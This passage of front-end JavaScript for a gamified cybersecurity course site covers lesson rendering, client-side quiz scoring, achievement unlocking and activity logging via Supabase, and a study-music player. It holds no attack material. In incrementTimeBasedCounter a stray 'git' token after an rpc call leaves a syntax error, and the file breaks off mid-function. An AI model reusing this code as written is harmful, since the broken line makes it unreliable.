        const lessonProgress = courseProgress[currentLesson.id];

        if (lessonProgress?.currentSessionStart) {
          const sessionTime = Math.floor(
            (new Date() - new Date(lessonProgress.currentSessionStart)) /
              1000 /
              60
          );
          lessonProgress.timeSpent =
            (lessonProgress.timeSpent || 0) + sessionTime;
          delete lessonProgress.currentSessionStart;
        }
      }

      // =====================================================
      // LESSON CONTENT RENDERING
      // =====================================================
      function renderLessonContent(lesson) {
        const contentContainer = document.getElementById("lessonContent");
        if (!contentContainer) return;

        let contentHTML = `
        <div class="content-section">
            <h2>Learning Objectives</h2>
            <ul>
                ${lesson.objectives.map((obj) => `<li>${obj}</li>`).join("")}
            </ul>
        </div>
        
        <div class="content-section">
            <h2>Overview</h2>
            <p>${lesson.content.overview}</p>
        </div>
    `;

        // Render content sections
        lesson.content.sections.forEach((section) => {
          contentHTML += `
            <div class="content-section">
                <h2>${section.title}</h2>
                ${section.content}
                ${
                  section.image
                    ? `<img src="${section.image}" alt="${section.title}" class="content-image" loading="lazy">`
                    : ""
                }
            </div>
        `;
        });

        // Render code examples
        if (
          lesson.content.codeExamples &&
          lesson.content.codeExamples.length > 0
        ) {
          contentHTML += `<div class="content-section"><h2>Code Examples</h2></div>`;

          lesson.content.codeExamples.forEach((example, index) => {
            const codeId = `code-${lesson.id}-${index}`;
            contentHTML += `
                <div class="code-section">
                    <div class="code-header">
                        <span class="code-title">${example.title}</span>
                        <button class="copy-btn" onclick="copyCode('${codeId}')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>
                    <pre class="code-block"><code id="${codeId}" class="language-${
              example.language
            }">${escapeHtml(example.code)}</code></pre>
                </div>
            `;
          });
        }

        // Render quiz
        contentHTML += renderQuiz(lesson.quiz);

        contentContainer.innerHTML = contentHTML;

        // Highlight code syntax if Prism is available
        setTimeout(() => {
          if (window.Prism) {
            Prism.highlightAll();
          }
        }, 100);
      }

      // =====================================================
      // QUIZ SYSTEM
      // =====================================================
      function renderQuiz(quiz) {
        const currentLessonProgress =
          courseProgress[COURSE_DATA.lessons[currentLessonIndex].id];
        const isCompleted = currentLessonProgress?.completed || false;

        let quizHTML = `
        <div class="quiz-section" id="quizSection">
            <div class="quiz-header">
                <h2 class="quiz-title">
                    <i class="fas fa-clipboard-check"></i>
                    Knowledge Check
                </h2>
                <p class="quiz-info">
                    Complete this quiz with ${quiz.passingScore}% or higher to unlock the next lesson.
                </p>
            </div>
    `;

        if (isCompleted) {
          const savedScore = currentLessonProgress.quizScore || 0;
          quizHTML += `
            <div class="quiz-results show">
                <div class="quiz-score pass">${savedScore}%</div>
                <div class="quiz-message">
                    <strong>Lesson Completed!</strong><br>
                    You've successfully passed this lesson's quiz.
                </div>
            </div>
        `;
        } else {
          // Render quiz questions
          quiz.questions.forEach((question, qIndex) => {
            quizHTML += `
                <div class="quiz-question ${
                  qIndex === 0 ? "active" : ""
                }" data-question="${qIndex}">
                    <div class="question-header">
                        <span class="question-number">Question ${
                          qIndex + 1
                        }</span>
                        <span class="question-progress">${qIndex + 1}/${
              quiz.questions.length
            }</span>
                    </div>
                    <div class="question-text">${question.question}</div>
                    <div class="question-options">
                        ${question.options
                          .map(
                            (option, oIndex) => `
                            <div class="option" data-option="${oIndex}" onclick="selectOption(${qIndex}, ${oIndex})">
                                <span class="option-letter">${String.fromCharCode(
                                  65 + oIndex
                                )}</span>
                                <span class="option-text">${option}</span>
                            </div>
                        `
                          )
                          .join("")}
                    </div>
                </div>
            `;
          });

          quizHTML += `
            <div class="quiz-controls">
                <button class="btn btn-secondary" id="prevQuestionBtn" onclick="previousQuestion()" disabled>
                    <i class="fas fa-chevron-left"></i>
                    Previous
                </button>
                <div>
                    <button class="btn btn-secondary" id="nextQuestionBtn" onclick="nextQuestion()" disabled>
                        Next
                        <i class="fas fa-chevron-right"></i>
                    </button>
                    <button class="btn btn-primary" id="submitQuizBtn" onclick="submitQuiz()" style="display: none;">
                        <i class="fas fa-check"></i>
                        Submit Quiz
                    </button>
                </div>
            </div>

            <div class="quiz-results" id="quizResults">
                <div class="quiz-score" id="quizScore">0%</div>
                <div class="quiz-message" id="quizMessage"></div>
                <div class="quiz-actions">
                    <button class="btn btn-primary" id="continueBtn" onclick="completeLesson()" style="display: none;">
                        <i class="fas fa-arrow-right"></i>
                        Continue to Next Lesson
                    </button>
                    <button class="btn btn-secondary" onclick="retakeQuiz()">
                        <i class="fas fa-redo"></i>
                        Retake Quiz
                    </button>
                </div>
            </div>
        `;
        }

        quizHTML += "</div>";
        return quizHTML;
      }

      // Quiz interaction functions
      function selectOption(questionIndex, optionIndex) {
        // Clear previous selections
        document
          .querySelectorAll(`[data-question="${questionIndex}"] .option`)
          .forEach((opt) => {
            opt.classList.remove("selected");
          });

        // Select current option
        const selectedOption = document.querySelector(
          `[data-question="${questionIndex}"] [data-option="${optionIndex}"]`
        );
        selectedOption.classList.add("selected");

        // Store answer
        quizState.answers[questionIndex] = optionIndex;

        // Update navigation
        const isLastQuestion =
          questionIndex ===
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length - 1;
        if (isLastQuestion) {
          document.getElementById("submitQuizBtn").style.display =
            "inline-flex";
          document.getElementById("nextQuestionBtn").style.display = "none";
        } else {
          document.getElementById("nextQuestionBtn").disabled = false;
        }
      }

      function nextQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const nextQuestionEl = currentQuestionEl.nextElementSibling;

        if (
          nextQuestionEl &&
          nextQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          nextQuestionEl.classList.add("active");
          quizState.currentQuestion++;
          updateQuizNavigation();
        }
      }

      function previousQuestion() {
        const currentQuestionEl = document.querySelector(
          ".quiz-question.active"
        );
        const prevQuestionEl = currentQuestionEl.previousElementSibling;

        if (
          prevQuestionEl &&
          prevQuestionEl.classList.contains("quiz-question")
        ) {
          currentQuestionEl.classList.remove("active");
          prevQuestionEl.classList.add("active");
          quizState.currentQuestion--;
          updateQuizNavigation();
        }
      }

      function updateQuizNavigation() {
        const totalQuestions =
          COURSE_DATA.lessons[currentLessonIndex].quiz.questions.length;
        const prevBtn = document.getElementById("prevQuestionBtn");
        const nextBtn = document.getElementById("nextQuestionBtn");
        const submitBtn = document.getElementById("submitQuizBtn");

        prevBtn.disabled = quizState.currentQuestion === 0;

        const hasAnswer =
          quizState.answers[quizState.currentQuestion] !== undefined;
        const isLastQuestion = quizState.currentQuestion === totalQuestions - 1;

        if (isLastQuestion) {
          nextBtn.style.display = "none";
          submitBtn.style.display = hasAnswer ? "inline-flex" : "none";
        } else {
          nextBtn.style.display = "inline-flex";
          nextBtn.disabled = !hasAnswer;
          submitBtn.style.display = "none";
        }
      }

      async function submitQuiz() {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const quiz = lesson.quiz;
        let correctAnswers = 0;

        // Hide questions and controls
        document
          .querySelectorAll(".quiz-question")
          .forEach((q) => (q.style.display = "none"));
        document.querySelector(".quiz-controls").style.display = "none";

        // Calculate score and highlight answers
        quiz.questions.forEach((question, index) => {
          const userAnswer = quizState.answers[index];
          const correctAnswer = question.correct;
          const isCorrect = userAnswer === correctAnswer;

          if (isCorrect) correctAnswers++;

          // Highlight answers
          const questionEl = document.querySelector(
            `[data-question="${index}"]`
          );
          const options = questionEl.querySelectorAll(".option");

          options[correctAnswer].classList.add("correct");
          if (userAnswer !== correctAnswer && userAnswer !== undefined) {
            options[userAnswer].classList.add("incorrect");
          }
        });

        const score = Math.round(
          (correctAnswers / quiz.questions.length) * 100
        );
        const passed = score >= quiz.passingScore;

        // Update quiz results UI
        const quizScore = document.getElementById("quizScore");
        const quizMessage = document.getElementById("quizMessage");
        const quizActions = document.querySelector(".quiz-actions");

        quizScore.textContent = `${score}%`;
        quizScore.className = `quiz-score ${passed ? "pass" : "fail"}`;

        if (passed) {
          quizMessage.innerHTML = `
            <strong>Congratulations!</strong><br>
            You passed with ${score}%. You can now proceed to the next lesson.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-primary" onclick="completeLesson()">
                <i class="fas fa-arrow-right"></i>
                Continue to Next Lesson
            </button>
        `;

          // Mark lesson as completed
          await markLessonComplete(score);
        } else {
          quizMessage.innerHTML = `
            <strong>Not quite there yet.</strong><br>
            You scored ${score}%. You need ${quiz.passingScore}% to pass. Review the material and try again.
        `;

          quizActions.innerHTML = `
            <button class="btn btn-secondary" onclick="retakeQuiz()">
                <i class="fas fa-redo"></i>
                Retake Quiz
            </button>
        `;
        }

        document.getElementById("quizResults").classList.add("show");

        // Log quiz completion
        logUserActivity("quiz_completed", {
          lesson_id: lesson.id,
          lesson_title: lesson.title,
          score: score,
          passed: passed,
          attempts: (courseProgress[lesson.id]?.quizAttempts || 0) + 1,
        });

        // Scroll to results
        document
          .getElementById("quizResults")
          .scrollIntoView({ behavior: "smooth" });
      }

      function retakeQuiz() {
        // Reset quiz state
        quizState = {
          currentQuestion: 0,
          answers: [],
          score: 0,
          isComplete: false,
        };

        // Track quiz retry
        const lessonId = COURSE_DATA.lessons[currentLessonIndex].id;
        if (!courseProgress[lessonId]) courseProgress[lessonId] = {};
        courseProgress[lessonId].quizAttempts =
          (courseProgress[lessonId].quizAttempts || 0) + 1;

        // Reload lesson content
        loadLesson(currentLessonIndex);

        // Scroll to quiz
        setTimeout(() => {
          document
            .getElementById("quizSection")
            .scrollIntoView({ behavior: "smooth" });
        }, 500);
      }

      async function markLessonComplete(score) {
        const lesson = COURSE_DATA.lessons[currentLessonIndex];
        const lessonId = lesson.id;

        // Track lesson completion time
        trackLessonTime();

        // Update lesson progress
        courseProgress[lessonId] = {
          ...courseProgress[lessonId],
          completed: true,
          quizScore: score,
          completedAt: new Date().toISOString(),
          finalScore: score,
        };

        // Update session tracking
        courseSession.lessonsCompleted++;

        // Save progress to database
        await saveProgress();

        // Update UI
        renderSidebar();
        updateNavigationButtons();

        // Check various achievements
        await checkLessonCompletionAchievements();
        await checkPerfectScoreAchievements(score);
        await checkStudyTimeAchievements();

        // Log lesson completion
        logUserActivity("lesson_completed", {
          lesson_id: lessonId,
          lesson_title: lesson.title,
          final_score: score,
          time_spent: courseProgress[lessonId].timeSpent || 0,
          lesson_number: currentLessonIndex + 1,
        });

        showToast("Lesson completed successfully!", "success");
      }

      async function completeLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          // Move to next lesson
          currentLessonIndex++;
          loadLesson(currentLessonIndex);
        } else {
          // Course completion
          await completeCourse();
        }
      }

      async function completeCourse() {
        try {
          const completionTime = courseSession.totalStudyTime;

          // Update course progress to 100% completed
          await supabase
            .from("course_progress")
            .update({
              progress: 100,
              completed_at: new Date().toISOString(),
              completion_time_minutes: completionTime,
            })
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Award course completion achievements
          await checkAndUnlockAchievement("course_completion_1");
          await checkSpeedCompletionAchievements(completionTime);
          await checkCourseStreakAchievements();

          // Update user stats
          await updateUserStats();

          // Show completion message
          showToast(
            "Congratulations! Course completed successfully!",
            "certificate"
          );

          // Log course completion
          logUserActivity("course_completed", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            completion_time_minutes: completionTime,
            total_lessons: COURSE_DATA.lessons.length,
            average_quiz_score: calculateAverageQuizScore(),
          });

          // Redirect to dashboard after delay
          setTimeout(() => {
            window.location.href = "/dashboard.html";
          }, 3000);
        } catch (error) {
          console.error("Error completing course:", error);
          showToast("Error marking course as complete", "error");
        }
      }

      // =====================================================
      // ACHIEVEMENT INTEGRATION SYSTEM
      // =====================================================
      async function checkAndUnlockAchievement(
        achievementId,
        skipNotification = false
      ) {
        try {
          // Prevent duplicate checks
          const cacheKey = `achievement_${achievementId}_${currentUser.id}`;
          if (sessionStorage.getItem(cacheKey)) return false;

          // Check if already unlocked
          const { data: existing, error } = await supabase
            .from("user_achievements")
            .select("id")
            .eq("user_id", currentUser.id)
            .eq("achievement_id", achievementId)
            .single();

          if (existing) {
            sessionStorage.setItem(cacheKey, "true");
            return false;
          }

          // Award achievement
          const achievementData = {
            user_id: currentUser.id,
            achievement_id: achievementId,
            unlocked_at: new Date().toISOString(),
            points_awarded: getAchievementPoints(achievementId),
            context: "course_system",
          };

          const { data, error: insertError } = await supabase
            .from("user_achievements")
            .insert([achievementData])
            .select()
            .single();

          if (insertError) {
            if (insertError.code === "23505") return false; // Already exists
            throw insertError;
          }

          // Update user points
await supabase.rpc('increment_user_stats', {
  user_id_param: currentUser.id,
  points_to_add: achievementData.points_awarded,
  achievements_to_add: 1
});

          // Cache and queue notification
          sessionStorage.setItem(cacheKey, "true");

          if (!skipNotification) {
            queueAchievementNotification({
              id: achievementId,
              name: getAchievementName(achievementId),
              description: getAchievementDescription(achievementId),
              points: achievementData.points_awarded,
              rarity: getAchievementRarity(achievementId),
              icon: getAchievementIcon(achievementId),
            });
          }

          return true;
        } catch (error) {
          console.error("Error unlocking achievement:", error);
          return false;
        }
      }

      // Helper functions for achievement data (replace with your actual achievement definitions)
      function getAchievementPoints(id) {
        const pointsMap = {
          first_course_start: 75,
          first_lesson: 100,
          course_completion_1: 500,
          perfect_score: 250,
          speed_demon: 750,
          marathon_learner: 500,
          night_owl: 200,
          early_bird: 200,
          weekend_warrior: 150,
          // Add more as needed
        };
        return pointsMap[id] || 100;
      }

      function getAchievementName(id) {
        const nameMap = {
          first_course_start: "Learning Initiated",
          first_lesson: "First Steps",
          course_completion_1: "Course Conqueror",
          perfect_score: "Perfectionist",
          speed_demon: "Speed Demon",
          // Add more as needed
        };
        return nameMap[id] || "Achievement Unlocked";
      }

      function getAchievementDescription(id) {
        const descMap = {
          first_course_start: "Start your first cybersecurity course",
          first_lesson: "Complete your first lesson",
          course_completion_1: "Complete your first course",
          perfect_score: "Score 100% on any quiz",
          speed_demon: "Complete a course in under 2 hours",
          // Add more as needed
        };
        return descMap[id] || "Achievement description";
      }

      function getAchievementRarity(id) {
        const rarityMap = {
          first_course_start: "common",
          first_lesson: "bronze",
          course_completion_1: "silver",
          perfect_score: "gold",
          speed_demon: "legendary",
          // Add more as needed
        };
        return rarityMap[id] || "common";
      }

      function getAchievementIcon(id) {
        const iconMap = {
          first_course_start: "fas fa-play",
          first_lesson: "fas fa-baby",
          course_completion_1: "fas fa-trophy",
          perfect_score: "fas fa-star",
          speed_demon: "fas fa-rocket",
          // Add more as needed
        };
        return iconMap[id] || "fas fa-award";
      }

      async function checkLessonAchievements(lessonNumber) {
        if (lessonNumber === 1) {
          await checkAndUnlockAchievement("first_lesson");
        }

        // Check if user has completed multiple lessons in one day
        const today = new Date().toISOString().split("T")[0];
        const todayCompletions = Object.values(courseProgress).filter(
          (p) => p.completed && p.completedAt?.startsWith(today)
        ).length;

        if (todayCompletions >= 3) {
          await checkAndUnlockAchievement("lesson_marathon");
        }
      }

      async function checkLessonCompletionAchievements() {
        const completedCount = getCompletedLessonsCount();

        // Lesson-based achievements
        const lessonMilestones = [1, 5, 10, 25, 50, 100];
        for (const milestone of lessonMilestones) {
          if (completedCount >= milestone) {
            await checkAndUnlockAchievement(`lessons_${milestone}`);
          }
        }

        // Course completion achievements
        if (completedCount === COURSE_DATA.lessons.length) {
          await checkAndUnlockAchievement("course_completion_1");

          // Check for additional course completion achievements
          const { data: allCourses } = await supabase
            .from("course_progress")
            .select("course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100);

          const totalCompleted = allCourses?.length || 0;

          const courseMilestones = [1, 5, 10, 25];
          for (const milestone of courseMilestones) {
            if (totalCompleted >= milestone) {
              await checkAndUnlockAchievement(`course_completion_${milestone}`);
            }
          }
        }
      }

      async function checkPerfectScoreAchievements(score) {
        if (score === 100) {
          await checkAndUnlockAchievement("perfect_score");

          // Check for consecutive perfect scores
          const recentScores = Object.values(courseProgress)
            .filter((p) => p.completed && p.quizScore)
            .slice(-5) // Last 5 completed
            .map((p) => p.quizScore);

          if (
            recentScores.length >= 3 &&
            recentScores.every((s) => s === 100)
          ) {
            await checkAndUnlockAchievement("perfectionist_streak");
          }
        }
      }

      async function checkSpeedCompletionAchievements(completionTime) {
        // Speed demon: Complete course in under 2 hours (120 minutes)
        if (completionTime <= 120) {
          await checkAndUnlockAchievement("speed_demon");
        }

        // Quick learner: Complete course in under 4 hours (240 minutes)
        if (completionTime <= 240) {
          await checkAndUnlockAchievement("quick_learner");
        }
      }

      async function checkStudyTimeAchievements() {
        const totalTime = courseSession.totalStudyTime;

        // Marathon learner: Study for 8+ hours in a course session
        if (totalTime >= 480) {
          // 8 hours
          await checkAndUnlockAchievement("marathon_learner");
        }

        // Dedicated learner: Study for 4+ hours
        if (totalTime >= 240) {
          // 4 hours
          await checkAndUnlockAchievement("dedicated_learner");
        }
      }

      async function checkCourseStreakAchievements() {
        try {
          // Check for consecutive course completions
          const { data: recentCourses, error } = await supabase
            .from("course_progress")
            .select("completed_at, course_id")
            .eq("user_id", currentUser.id)
            .eq("progress", 100)
            .order("completed_at", { ascending: false })
            .limit(10);

          if (error || !recentCourses) return;

          // Check for courses completed on consecutive days
          let consecutiveDays = 1;
          for (let i = 1; i < recentCourses.length; i++) {
            const prevDate = new Date(
              recentCourses[i - 1].completed_at
            ).toDateString();
            const currentDate = new Date(
              recentCourses[i].completed_at
            ).toDateString();
            const dayDiff =
              Math.abs(new Date(prevDate) - new Date(currentDate)) /
              (1000 * 60 * 60 * 24);

            if (dayDiff <= 1) {
              consecutiveDays++;
            } else {
              break;
            }
          }

          if (consecutiveDays >= 3) {
            await checkAndUnlockAchievement("learning_streak");
          }
        } catch (error) {
          console.error("Error checking course streak achievements:", error);
        }
      }

      // =====================================================
      // TIME-BASED ACHIEVEMENTS
      // =====================================================
      async function checkTimeBasedAchievements(timestamp) {
        const hour = timestamp.getHours();
        const dayOfWeek = timestamp.getDay();

        // Night owl (after midnight, before 6 AM)
        if (hour >= 0 && hour < 6) {
          await incrementTimeBasedCounter("midnight_sessions", "night_owl");
        }

        // Early bird (4 AM to 6 AM)
        if (hour >= 4 && hour < 6) {
          await incrementTimeBasedCounter("early_sessions", "early_bird");
        }

        // Weekend warrior (Saturday = 6, Sunday = 0)
        if (dayOfWeek === 0 || dayOfWeek === 6) {
          await incrementTimeBasedCounter(
            "weekend_sessions",
            "weekend_warrior"
          );
        }
      }

      async function incrementTimeBasedCounter(counterType, achievementId) {
        try {
          const dateStr = new Date().toISOString().split("T")[0];
          const cacheKey = `${counterType}_${currentUser.id}_${dateStr}`;

          // Prevent multiple increments per day
          if (sessionStorage.getItem(cacheKey)) return;

          // Update counter
          await supabase.rpc('increment_profile_counter', {
  user_id_param: currentUser.id,
  counter_field: counterType,
  increment_value: 1
});git

          // Cache to prevent double counting
          sessionStorage.setItem(cacheKey, "true");

          // Check related achievement
          if (achievementId) {
            await checkAndUnlockAchievement(achievementId, true);
          }
        } catch (error) {
          console.error(`Error incrementing ${counterType}:`, error);
        }
      }

      async function checkDailyStreak() {
        try {
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("last_activity, current_streak, last_streak_date")
            .eq("id", currentUser.id)
            .single();

          if (error) throw error;

          const now = new Date();
          const today = now.toDateString();
          const lastActivity = profile.last_activity
            ? new Date(profile.last_activity)
            : null;
          const lastStreakDate = profile.last_streak_date
            ? new Date(profile.last_streak_date).toDateString()
            : null;

          let newStreak = profile.current_streak || 0;
          let shouldUpdateStreak = false;

          if (!lastActivity) {
            // First time user
            newStreak = 1;
            shouldUpdateStreak = true;
          } else {
            const daysSinceLastActivity = Math.floor(
              (now - lastActivity) / (1000 * 60 * 60 * 24)
            );

            if (lastStreakDate === today) {
              // Already counted today's streak
              return newStreak;
            } else if (
              daysSinceLastActivity === 1 ||
              (daysSinceLastActivity === 0 && lastStreakDate !== today)
            ) {
              // Consecutive day or same day but not counted yet
              newStreak += 1;
              shouldUpdateStreak = true;
            } else if (daysSinceLastActivity > 1) {
              // Streak broken
              newStreak = 1;
              shouldUpdateStreak = true;
            }
          }

          if (shouldUpdateStreak) {
            await supabase
              .from("profiles")
              .update({
                current_streak: newStreak,
                last_activity: now.toISOString(),
                last_streak_date: now.toISOString(),
              })
              .eq("id", currentUser.id);

            userStats.current_streak = newStreak;

            showToast(`Daily streak: ${newStreak} days!`, "success");
            await checkStreakAchievements(newStreak);
          }

          return newStreak;
        } catch (error) {
          console.error("Error checking daily streak:", error);
          return 0;
        }
      }

      async function checkStreakAchievements(currentStreak) {
        const streakMilestones = [3, 7, 14, 30, 100, 365];

        for (const milestone of streakMilestones) {
          if (currentStreak >= milestone) {
            await checkAndUnlockAchievement(`streak_${milestone}`);
          }
        }
      }

      // =====================================================
      // USER ACTIVITY LOGGING
      // =====================================================
      async function logUserActivity(activityType, metadata = {}) {
        try {
          const now = new Date();

          const activityData = {
            user_id: currentUser.id,
            activity_type: activityType,
            timestamp: now.toISOString(),
            course_id: COURSE_DATA.id,
            lesson_index: currentLessonIndex,
            session_duration: courseSession.totalStudyTime,
            metadata: JSON.stringify(metadata),
            created_at: now.toISOString(),
          };

          // Try to log to activities table
          const { error } = await supabase
            .from("user_activities")
            .insert([activityData]);

          if (error && error.code !== "42P01") {
            console.warn("Activity logging failed:", error.message);
          }

          // Always update last activity in profile
          await supabase
            .from("profiles")
            .update({ last_activity: now.toISOString() })
            .eq("id", currentUser.id);
        } catch (error) {
          console.error("Error logging user activity:", error);
        }
      }

      // =====================================================
      // NAVIGATION SYSTEM
      // =====================================================
      function updateNavigationButtons() {
        const prevBtn = document.getElementById("prevLessonBtn");
        const nextBtn = document.getElementById("nextLessonBtn");

        if (!prevBtn || !nextBtn) return;

        // Previous button
        prevBtn.disabled = currentLessonIndex === 0;

        // Next button logic
        const isLastLesson =
          currentLessonIndex === COURSE_DATA.lessons.length - 1;
        const canGoNext =
          currentLessonIndex < COURSE_DATA.lessons.length - 1 &&
          canAccessLesson(currentLessonIndex + 1);

        if (isLastLesson) {
          const isCurrentCompleted =
            courseProgress[COURSE_DATA.lessons[currentLessonIndex].id]
              ?.completed;
          nextBtn.disabled = !isCurrentCompleted;
          nextBtn.innerHTML = '<i class="fas fa-trophy"></i> Complete Course';
        } else {
          nextBtn.disabled = !canGoNext;
          nextBtn.innerHTML = 'Next <i class="fas fa-chevron-right"></i>';
        }
      }

      // Navigation button event handlers
      function goToPreviousLesson() {
        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
